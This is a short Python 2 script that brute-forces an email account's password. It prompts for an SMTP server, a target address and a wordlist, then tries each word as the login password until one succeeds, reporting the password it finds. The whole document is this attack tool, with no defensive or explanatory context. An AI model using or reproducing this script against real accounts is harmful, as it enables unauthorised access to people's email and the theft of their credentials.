#!/usr/bin/python
#
#
import smtplib

print "Please enter the smtp server address"
server = raw_input("> ")
print "Please enter the smtp server port"
port = raw_input("> ")

smtpserver = smtplib.SMTP(server, port)
smtpserver.ehlo()
smtpserver.starttls()

print "Please enter the targets email address."
user = raw_input("> ")

print "Please enter the path to the worldlist."
passwfile = raw_input("> ")

passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] password found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] password incorrect: %s" % password
